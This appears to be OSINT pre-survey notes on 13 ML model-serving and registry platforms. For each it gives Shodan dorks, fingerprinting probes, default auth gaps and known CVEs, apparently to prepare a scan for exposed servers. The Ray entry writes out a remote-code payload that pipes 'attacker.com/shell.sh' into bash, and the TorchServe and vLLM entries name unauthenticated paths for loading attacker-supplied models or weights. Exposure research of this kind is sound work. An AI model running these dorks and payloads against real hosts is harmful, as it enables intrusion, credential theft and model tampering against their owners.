# Model Serving / Registry Platform OSINT — Pre-Survey Intelligence
**Date:** 2026-05-27
**Purpose:** Tune dork queries, understand auth posture, identify verification probes, document data exposure classes before Shodan harvests.
**Scope:** 13 platforms — model inference servers, model registries, serving infrastructure.
**Status:** Pre-survey. No active probing conducted.

---

## Triton Inference Server (NVIDIA)

**Category:** Model Inference Server
**Default Ports:** 8000 (HTTP REST), 8001 (gRPC), 8002 (Prometheus metrics)
**Auth Default (Inference):** off — no auth required
**Auth Default (Management):** off — model loading/unloading via HTTP, no auth
**Shodan Dork (primary):** `port:8000 "/v2/health/ready"`
**Shodan Dork (secondary):** `port:8000 "NV-Status" http.title:"triton"`
**Shodan Dork (tertiary):** `port:8002 "nv_inference_request_success" product:"triton"`
**Verification Probe:** `GET /v2` → 200 + `{"name":"triton","version":"...","extensions":[...]}` — `extensions` array includes `"classification"`, `"sequence"`, `"model_configuration"`, `"schedule_policy"`, `"model_repository"`, `"statistics"`, `"trace"`, `"logging"`
**Verification Probe (alt):** `GET /v2/health/ready` → 200 confirms live service
**Data Exposure Class:** Model names and versions via `/v2/models` (no auth); model repository listing (file paths, config); shared memory regions; server statistics; GPU utilization metrics on port 8002; model configuration including input/output tensor shapes
**Known CVEs:**
- CVE-2024-0087 (CVSS 7.5) — arbitrary file write via `/v2/logging` `log_file` parameter; targets `/root/.bashrc` or model directories
- CVE-2024-0088 (CVSS 7.5) — memory write/read via insufficient validation of `shared_memory_offset` in `/v2/systemsharedmemory/region/{name}/register`
- CVE-2025-23333 — additional post-2024 bulletin; see NVIDIA PSIRT advisories
- Multiple 2025 bulletins: August 2025, September 2025, May 2026
**Default Credentials:** none
**Notes:** Management plane (model load/unload) shares port 8000 with inference. NVIDIA's own Secure Deployment Considerations Guide explicitly warns against public exposure. The `/v2/systemsharedmemory` and `/v2/cudasharedmemory` endpoints are high-value for CVE exploitation chains. Port 8002 exposes Prometheus metrics including per-model request counts — confirms models loaded without triggering inference. Merlin recommendation stacks (NVIDIA-Merlin/systems) use Triton as the backend inference engine: same port profile, same auth posture.

---

## NVIDIA Merlin (Recommendation Models)

**Category:** Recommendation Model Inference (Triton-backed)
**Default Ports:** 8000 (HTTP, via Triton), 8001 (gRPC, via Triton), 8002 (metrics, via Triton)
**Auth Default (Inference):** off (inherited from Triton)
**Auth Default (Management):** off (inherited from Triton)
**Shodan Dork (primary):** `port:8000 "/v2/models" "recsys" OR "ranking" OR "retrieval"`
**Shodan Dork (secondary):** `port:8000 "merlin" "/v2/health/ready"`
**Verification Probe:** `GET /v2/models` — presence of ensemble model names containing `"ranking"`, `"retrieval"`, `"recsys"`, or Merlin-convention names (`"candidate_retrieval"`, `"item_retrieval"`) distinguishes Merlin from generic Triton
**Data Exposure Class:** Recommendation model architecture; item embedding shapes; user/item feature schemas via model metadata; inference output confirms recommendation pipeline topology
**Known CVEs:** Inherited Triton CVEs (see above). No Merlin-specific CVEs found.
**Default Credentials:** none
**Notes:** Merlin is not a standalone server — it is an end-to-end pipeline (NVTabular + Merlin Models + Merlin Systems) that compiles serving ensembles deployed on Triton. The distinguishing signal is the model naming convention and ensemble structure. Most Merlin deployments use Docker image `nvcr.io/nvidia/merlin/merlin-tensorflow-inference`. Treat as Triton for all dork/probe purposes; model names are the attribution signal.

---

## TorchServe (PyTorch)

**Category:** Model Inference Server
**Default Ports:** 8080 (inference HTTP), 8081 (management HTTP), 8082 (metrics HTTP), 7070 (inference gRPC), 7071 (management gRPC)
**Auth Default (Inference):** off — no native auth
**Auth Default (Management):** off — **critical gap**: documented as localhost-only but binds to `0.0.0.0:8081` by default (ShellTorch)
**Shodan Dork (primary):** `port:8081 "models" "nextPageToken" http.status:200`
**Shodan Dork (secondary):** `port:8081 "/models" http.title:"TorchServe"`
**Shodan Dork (tertiary):** `port:8080 "torchserve" OR "pytorch"`
**Verification Probe:** `GET /models` on port 8081 → `{"models":[{"modelName":"...","modelUrl":"..."}],"nextPageToken":"..."}` — `nextPageToken` field is the unique discriminator
**Data Exposure Class:** Full model inventory (names, URLs, version, min/max workers, runtime, GPU flag, memory usage); model .mar file paths and origin URLs; batch size configuration; worker thread counts and queue depth; via `POST /models` can register arbitrary remote model URLs (pre-patch)
**Known CVEs:**
- CVE-2023-43654 (CVSS 9.8) — SSRF in management API enables arbitrary model upload from any URL → code execution. Fixed in 0.8.2.
- CVE-2022-1471 (CVSS 9.9) — SnakeYAML deserialization in model config files → RCE via maliciously crafted model archives.
- Kroll disclosed two additional vulnerabilities patched in v0.11 (2025): stack overflow and unsafe deserialization in model handler class loading.
**Default Credentials:** none
**Notes:** The ShellTorch research (Oligo Security, 2023) proved the `0.0.0.0` binding discrepancy between docs and actual behavior. Management port 8081 is the primary attack surface — unrestricted `POST /models?url=<attacker-controlled>` enables staged RCE. Metrics port 8082 exposes Prometheus counters that confirm which models are loaded. High FP risk on port 8080 (conflicts with many web services); target 8081 exclusively for identity confirmation.

---

## TensorFlow Serving

**Category:** Model Inference Server
**Default Ports:** 8501 (HTTP REST), 8500 (gRPC)
**Auth Default (Inference):** off — no built-in auth; binds `0.0.0.0` by default
**Auth Default (Management):** N/A — no management API; model config controlled at launch via `--model_config_file`
**Shodan Dork (primary):** `port:8501 "/v1/models/" http.status:200`
**Shodan Dork (secondary):** `port:8501 "model_version_status" "AVAILABLE"`
**Shodan Dork (tertiary):** `port:8501 "signature_name" "serving_default"`
**Verification Probe:** `GET /v1/models/{any_name}` → 200 + `{"model_version_status":[{"version":"...","state":"AVAILABLE","status":{}}]}` — `model_version_status` and `state: AVAILABLE` are unique to TF Serving
**Data Exposure Class:** Model names (via brute/guess at `/v1/models/{name}`); model versions and load state; model metadata including signature definitions (input/output tensor names and shapes); predictions without any credential gate
**Known CVEs:** No high-profile CVEs specific to TF Serving REST API. gRPC port 8500 has had integer overflow vulnerabilities in underlying TF ops. No native auth CVEs documented — the exposure is by design.
**Default Credentials:** none
**Notes:** TF Serving has no management API — models are baked into the deployment at startup. The `/v1/models/` path returns 404 if no model matches, which leaks negative information. Scanning `port:8501` has significant FP risk (other HTTP services). The `model_version_status` field name is specific to TF Serving's protobuf-to-JSON translation and a reliable discriminator. Note TF Serving is now maintenance-mode; production orgs increasingly migrating to TF2/Keras serving or vLLM for LLM workloads.

---

## Ray Serve (Anyscale)

**Category:** Distributed ML Inference Framework / Dashboard
**Default Ports:** 8265 (Ray dashboard + Jobs API), 8000 (Serve HTTP proxy — actual inference)
**Auth Default (Inference):** off — Ray Serve HTTP proxy has no auth
**Auth Default (Management):** off — dashboard Jobs API has no auth (CVE-2023-48022)
**Shodan Dork (primary):** `port:8265 "ray" http.status:200`
**Shodan Dork (secondary):** `port:8265 "/api/jobs" OR "/api/version" http.title:"Ray Dashboard"`
**Shodan Dork (tertiary):** `port:8265 "ray_version" OR "cluster_id"`
**Verification Probe:** `GET /api/version` on port 8265 → `{"ray_version":"...","ray_commit":"..."}` — `ray_commit` field is unique to Ray
**Data Exposure Class:** Ray cluster topology; all running actors, tasks, jobs; deployed Serve application routes and endpoint names; cloud provider credentials stored in Ray worker env (confirmed stolen in ShadowRay campaign: OpenAI keys, HuggingFace tokens, AWS/GCP/Azure credentials, K8s tokens, SSH private keys, model training data); job submission history; worker logs
**Known CVEs:**
- CVE-2023-48022 (CVSS 9.8, "ShadowRay") — unauthenticated job submission via Jobs API; actively exploited in the wild; disputed by Anyscale as design decision, not patched
- CVE-2023-6019 — arbitrary file read via `/api/v0/logs/file` (path traversal, no auth)
- CVE-2023-6020 — SSRF via `/log_proxy` endpoint `url` parameter (no auth)
- CVE-2023-6021 — related dashboard RCE chain
- CVE-2023-48023 — additional dashboard exploit
**Default Credentials:** none
**Notes:** ShadowRay (March 2024, Oligo Security) documented active exploitation of thousands of Ray clusters. Ray's maintainers dispute CVE-2023-48022 as a design decision ("Ray is not designed to be exposed publicly"). The Jobs API on port 8265 is the critical attack surface — `POST /api/jobs/` with `{"entrypoint":"bash -c 'curl attacker.com/shell.sh|bash'"}` achieves RCE. Ray 2.x added optional token auth (`--dashboard-token-auth`) but it is off by default. Port 8265 dorks have low FP risk since the Ray dashboard serves a distinctive SPA.

---

## BentoML / BentoServer

**Category:** Model Inference Server / Serving Framework
**Default Ports:** 3000 (HTTP API + web UI)
**Auth Default (Inference):** off — no auth by default; auth requires explicit ASGI middleware configuration
**Auth Default (Management):** off — no management API separate from inference
**Shodan Dork (primary):** `port:3000 "bentoml" http.status:200`
**Shodan Dork (secondary):** `port:3000 "Bento-Name" OR "Yatai-Bento-Deployment-Name"`
**Shodan Dork (tertiary):** `port:3000 "/docs.json" "bentoml"`
**Verification Probe:** `GET /docs.json` → OpenAPI spec with `info.title` containing service name + `BentoML` vendor annotations; or check HTTP response headers for `Server: BentoML`
**Data Exposure Class:** Full inference API (model predictions, no credential gate); OpenAPI spec at `/docs.json` exposes all endpoint signatures, input/output schemas; model service name and version in headers (`Bento-Name`, `Bento-Version`); runner configuration potentially exposed in error messages
**Known CVEs:** No specific CVEs found. Attack surface is the inference endpoints themselves (no auth = model access to any caller).
**Notes:** BentoML's security docs explicitly recommend adding ASGI middleware for auth — meaning the default is open. The HTTP client SDK sets `User-Agent: BentoML HTTP Client/{version}` which appears in request logs, not responses. Response header `Server: BentoML` is the fingerprint signal. Port 3000 has moderate FP risk (Node.js apps, dev servers). The `/docs.json` path yielding a BentoML-shaped OpenAPI spec is the reliable confirmation probe.

---

## Seldon Core

**Category:** Kubernetes-native Model Serving Operator
**Default Ports:** 9000 (HTTP REST inference), 9500 (gRPC inference), 80 (via Istio/Ambassador ingress)
**Auth Default (Inference):** off — SeldonDeployment pods expose 9000 directly with no auth; Istio auth is opt-in
**Auth Default (Management):** off — K8s CRD management via kubectl/API server (separate control plane)
**Shodan Dork (primary):** `port:9000 "/seldon/" "/api/v1.0/predictions"`
**Shodan Dork (secondary):** `port:9000 "SeldonDeployment" OR "seldon-core"`
**Shodan Dork (tertiary):** `port:80 "seldon" "/api/v1.0/predictions" http.status:200`
**Verification Probe:** `POST /seldon/{namespace}/{deployment}/api/v1.0/predictions` with `{"data":{"ndarray":[[1]]}}` → response contains `{"data":{"ndarray":[...]},"meta":{}}` — the `meta` wrapper object is a Seldon-specific response field
**Data Exposure Class:** Model predictions (unauthenticated); deployment namespace and model name visible in URL path; model graph topology implicit in ensemble deployments; error messages expose K8s namespace, pod names, and container versions
**Known CVEs:** No high-profile CVEs specific to Seldon inference API. Dependency-level CVEs addressed in releases (Go runtime, Python deps, KEDA). CVE-2024-14007 referenced in Red Hat portal (details limited).
**Default Credentials:** none
**Notes:** Seldon Core v1 EOL; Seldon Core v2 (Seldon AI) uses different architecture with scheduler. v2 HTTP port is 9000 per documentation. The path structure `/seldon/{namespace}/{name}/api/v1.0/predictions` is unique and precise — FP risk is very low. Authentication is intentionally delegated to Istio/Ambassador layer; bare deployments (common in dev/staging) have no auth at all. Token auth requires non-default HTTPS configuration (SeldonClient docs warn about HTTP+token as insecure).

---

## KServe / KFServing

**Category:** Kubernetes-native Model Serving (Serverless + Kubernetes)
**Default Ports:** 80 (via Knative/Istio ingress), 8080 (predictor pod internal), 9000 (gRPC predictor)
**Auth Default (Inference):** off — InferenceService HTTP endpoint is publicly accessible by default without auth
**Auth Default (Management):** K8s API server (requires kubeconfig/RBAC) — not directly internet-exposed
**Shodan Dork (primary):** `port:80 "/v2/models/" "model_name" "ready"`
**Shodan Dork (secondary):** `http.title:"KServe" OR port:8080 "/v2/health/ready" "ready":true`
**Shodan Dork (tertiary):** `port:80 "/v2/models" "platform" "inputs" "outputs" http.status:200`
**Verification Probe:** `GET /v2/models/{name}` → `{"name":"...","versions":["1"],"platform":"...","inputs":[{"name":"...","datatype":"...","shape":[...]}],"outputs":[...]}` — `platform` field (e.g. `"sklearn"`, `"xgboost"`, `"tensorflow"`, `"triton"`) is unique to KServe V2 protocol
**Data Exposure Class:** Model metadata (input/output schema, platform/framework, version list); inference results; in Kubeflow-integrated deployments, probe failures expose internal K8s service DNS
**Known CVEs:** No KServe-specific CVEs found. Default public InferenceService exposure is documented as a known limitation (GitHub issue #760 open since 2020). Auth requires Istio RequestAuthentication + Dex integration; not enabled by default.
**Default Credentials:** none
**Notes:** KServe implements the Open Inference Protocol (V2) — same endpoint schema as Triton's `/v2/` tree. Deployed via Knative Serving; the Knative route URL is the public endpoint. Kubeflow-integrated deployments add Dex auth (cookie-based), but standalone KServe without Kubeflow has no auth layer. The `platform` field in model metadata (`sklearn`, `xgboost`, `pytorch`, etc.) disambiguates from raw Triton. FP risk is medium on port 80 (many web services); `/v2/models` path reduces this significantly.

---

## ONNX Runtime Server

**Category:** Model Inference Server
**Default Ports:** 8001 (HTTP REST); configurable via `--http_port`
**Auth Default (Inference):** off — no built-in auth; binds `0.0.0.0` by default
**Auth Default (Management):** N/A — no management API; models loaded at startup
**Shodan Dork (primary):** `port:8001 "/v1/models/" onnx http.status:200`
**Shodan Dork (secondary):** `port:8001 "onnxruntime" OR ".onnx" "/predict"`
**Verification Probe:** `GET /v1/models/{model_name}/versions/{version}:predict` (POST for inference) — error response on GET contains `"onnxruntime"` or model-not-found with ONNX-specific error text; or check for path pattern `/v1/models/{name}/versions/{version}:predict`
**Data Exposure Class:** Model inference results without credential gate; model names if discoverable via path; ONNX model files potentially downloadable in misconfigured deployments
**Known CVEs:** No CVEs specific to ONNX Runtime Server's REST API found. Microsoft's Open Enclave variant (onnx-server-openenclave) adds attestation for confidential computing but is not the default open-source build.
**Default Credentials:** none
**Notes:** The Microsoft-official ONNX Runtime Server is lightly documented and seldom deployed standalone; more common as a component embedded in Azure ML or AML endpoints. The community fork `kibae/onnxruntime-server` (Docker Hub: `kibaes/onnxruntime-server`) is the more actively maintained standalone option and adds TCP + HTTPS modes. Port 8001 conflicts with Triton's gRPC port — when scanning, HTTP service on 8001 indicates ONNX Runtime Server or Triton HTTP if misconfigured. FP risk on port 8001 is moderate (various services). The path `/v1/models/` is shared with TF Serving — use the response error format to discriminate (ONNX returns different error text than TF Serving's protobuf-to-JSON).

---

## Hugging Face Text Generation Inference (TGI)

**Category:** LLM Inference Server (Self-hosted)
**Default Ports:** 80 (internal container port), 8080 (common host-mapped port via Docker `-p 8080:80`)
**Auth Default (Inference):** off — no auth required; tokens optional via `HF_API_TOKEN` env var for gated models download, not serving
**Auth Default (Management):** N/A — no management API; model loaded at container start
**Shodan Dork (primary):** `port:8080 "/info" "model_id" "model_dtype"`
**Shodan Dork (secondary):** `port:80 "/info" "max_total_tokens" "tokenization_workers"`
**Shodan Dork (tertiary):** `port:8080 "text-generation-inference" http.status:200`
**Verification Probe:** `GET /info` → `{"model_id":"...","model_dtype":"...","model_sha":"...","max_total_tokens":...,"tokenization_workers":...,"version":"..."}` — `tokenization_workers` and `model_sha` fields are TGI-specific
**Data Exposure Class:** Model ID (exposes which HF model is running, including private/gated models); inference via `/generate` and `/generate_stream`; token probability scores; full generation configuration; TGI is now in maintenance mode (2026) — field is migrating to vLLM/SGLang
**Known CVEs:** No high-profile CVEs specific to TGI. Maintenance mode announced 2026 — security patches limited to minor bug fixes.
**Default Credentials:** none
**Notes:** TGI's `/info` endpoint returns a highly distinctive JSON structure including `model_sha` (git commit hash of the model weights), `model_dtype` (bf16/fp16/int8), `max_input_length`, `max_total_tokens`, `tokenization_workers`. This is the highest-confidence fingerprint signal. The maintenance mode announcement means new deployments are declining; survey window is finite. Docker run pattern `-p 8080:80` means port 8080 on hosts, port 80 inside container — scan both. HuggingFace's own hosted inference uses TGI internally.

---

## vLLM

**Category:** LLM Inference Server (Self-hosted, OpenAI-compatible)
**Default Ports:** 8000 (HTTP, OpenAI-compatible API)
**Auth Default (Inference):** off by default — `--api-key` flag optional; when set, only protects `/v1/*` and `/v2/*` paths
**Auth Default (Management):** off — control endpoints (`/pause`, `/resume`, `/update_weights`, `/abort_requests`) bypass `--api-key` even when set
**Shodan Dork (primary):** `port:8000 "/v1/models" "max_model_len" http.status:200`
**Shodan Dork (secondary):** `port:8000 "vllm" "/v1/completions" http.status:200`
**Shodan Dork (tertiary):** `port:8000 "/version" "vllm" OR "max_model_len"`
**Verification Probe:** `GET /version` → `{"version":"0.x.x"}` (no auth required); `GET /v1/models` → `{"object":"list","data":[{"id":"...","object":"model","created":...,"owned_by":"vllm"}]}` — `"owned_by":"vllm"` is the discriminator
**Data Exposure Class:** Model name/ID (reveals which LLM is running including private fine-tunes); inference via `/v1/chat/completions` and `/v1/completions`; control operations (`/update_weights`, `/pause`, `/resume`) unauthenticated even with `--api-key` set; LoRA adapter management; tokenizer configuration
**Known CVEs:**
- CVE-2025-48956 — DoS via unlimited HTTP header sizes; fixed in vLLM 0.10.1.1
- CVE-2026-22778 (CVSS 9.8) — RCE via malicious video URL to multimodal model endpoint
- Six+ high-severity CVEs since 2025 covering RCE, SSRF, DoS
**Default Credentials:** none
**Notes:** vLLM is the dominant self-hosted LLM inference server (2025-2026). Already covered in prior surveys — this entry focuses on the registry/management gap. The unauthenticated control endpoints (`/pause`, `/resume`, `/update_weights`, `/scale_elastic_ep`) represent a management plane bypass even on deployments that correctly set `--api-key`. `/update_weights` enables loading attacker-supplied model weights without authentication. Dev mode (`VLLM_SERVER_DEV_MODE=1`) adds `/collective_rpc` which executes arbitrary RPC calls — zero auth.

---

## MLflow Model Registry

**Category:** Model Registry / Experiment Tracking (Registry API focus)
**Default Ports:** 5000 (MLflow Tracking Server HTTP)
**Auth Default (Inference):** N/A — registry API, not inference
**Auth Default (Management):** off — auth is optional plugin (`mlflow.auth`); not enabled by default; when disabled, `/api/2.0/mlflow/registered-models/*` is fully open
**Shodan Dork (primary):** `port:5000 "/api/2.0/mlflow/registered-models" http.status:200`
**Shodan Dork (secondary):** `port:5000 "mlflow" "registered_models" http.title:"MLflow"`
**Shodan Dork (tertiary):** `port:5000 "experiment_id" "run_id" http.status:200`
**Verification Probe:** `GET /api/2.0/mlflow/registered-models/list` → `{"registered_models":[{"name":"...","creation_timestamp":...,"last_updated_timestamp":...,"latest_versions":[...]}]}` — `registered_models` array with `creation_timestamp` is unique to MLflow
**Data Exposure Class:** Full model registry (all registered model names, versions, aliases, tags, descriptions); experiment runs with metrics, parameters, artifact paths; model artifacts potentially downloadable via artifact store if using local filesystem; MLflow run source code references; git commit hashes; dataset references; training data paths
**Known CVEs:**
- CVE-2024-2928 — Local File Inclusion via URI fragment manipulation (`#` in artifact paths); affects versions < 2.11.3; allows unauthenticated file read
- CVE-2026-2651 — Unauthorized access to multipart upload endpoints in `--serve-artifacts` mode; model supply chain poisoning; arbitrary code execution path
- CVE-2026-2652 — Auth bypass: FastAPI middleware only enforces auth on `/gateway/` routes; `/ajax-api/3.0/jobs/*` unprotected even with auth enabled
- CVE-2026-0545 — Auth bypass vulnerability
- CVE-2026-2033 — RCE via Tracking Server
- Acunetix fingerprint entry: "Unrestricted access to MLflow" confirms this is a documented vulnerability class
**Default Credentials:** none — auth disabled by default
**Notes:** MLflow is already partially covered in prior surveys (experiment tracking focus). This entry focuses on the Model Registry API specifically. Key endpoint: `GET /api/2.0/mlflow/registered-models/list` returns all registered models without auth on unprotected instances. Model artifact download via `GET /get-artifact?path=...&run_uuid=...` can expose model weights if using local artifact store. The Databricks-hosted MLflow (Unity Catalog) requires auth; self-hosted instances typically do not. Survey note: differentiate self-hosted (port 5000, no auth) from Databricks-managed (always auth).

---

## Cortex (cortexlabs)

**Category:** Model Serving Infrastructure (Kubernetes-native, AWS EKS)
**Default Ports:** 8080 (RealtimeAPI and BatchAPI default via `$CORTEX_PORT`), varies per deployment
**Auth Default (Inference):** off by default for internal deployments; AWS API Gateway optional for external
**Auth Default (Management):** off within cluster; `cortex` CLI uses AWS IAM for operator authentication
**Shodan Dork (primary):** `port:8080 "cortex" "/predict" http.status:200`
**Shodan Dork (secondary):** `port:8080 "cortexlabs" OR "nucleus" "/predict" OR "/run"`
**Verification Probe:** No unique public-facing API fingerprint — Cortex wraps arbitrary Python/TensorFlow/PyTorch containers. Check for `X-Cortex-*` headers or Cortex operator response envelopes; error messages from Nucleus server may contain `cortex` references.
**Data Exposure Class:** Model inference results; when Nucleus (Cortex's TF/Python model server) is exposed: model configuration, input/output schemas
**Known CVEs:** None documented. Cortexlabs archived the cortex repo (maintenance mode); last release 0.42.x.
**Default Credentials:** none
**Notes:** Cortexlabs/cortex is largely deprecated (repo archived). Active deployments are legacy. The project wrapped user models in containers deployed on AWS EKS — the "Cortex" branding is invisible at the network layer unless Nucleus is the server. FP risk is high on port 8080. Low-yield survey target given archive status. Include for completeness but expect minimal Shodan surface.

---

## Comet ML Model Registry

**Category:** SaaS Model Registry (cloud-hosted, API-key required)
**Default Ports:** 443 (HTTPS, comet.com hosted); self-hosted Opik on 5173/3000
**Auth Default (Registry API):** on — all Comet ML API calls require `COMET_API_KEY`; no unauthenticated access path documented
**Auth Default (Management):** on — API key mandatory
**Shodan Dork (primary):** N/A — hosted SaaS with mandatory auth; no self-hosted model registry surface
**Shodan Dork (secondary):** `port:5173 "opik" http.status:200` (for self-hosted Comet Opik LLM observability)
**Verification Probe:** N/A for registry API. For self-hosted Opik: `GET /api/v1/private/health` on port 5173
**Data Exposure Class:** Registry API requires key — no unauthenticated exposure of model artifacts. API key exposure in git/env files is the risk vector (GitGuardian documents Comet API key detection pattern).
**Known CVEs:** GitHub issue #949 on Comet Opik requests authentication/authorization — implies self-hosted Opik instances may lack auth. No registry-specific CVEs found.
**Default Credentials:** none
**Notes:** Comet ML's core model registry is SaaS-only with mandatory auth — not a Shodan-viable survey target for the registry itself. However, Comet recently released Opik (open-source LLM observability / tracing platform) which can be self-hosted. Opik runs on ports 5173 (UI) and 3000 (API). GitHub issue #949 indicates auth was a feature request as of 2025, suggesting early self-hosted Opik deployments may lack auth. Survey target is Opik self-hosted, not the core Comet ML registry.
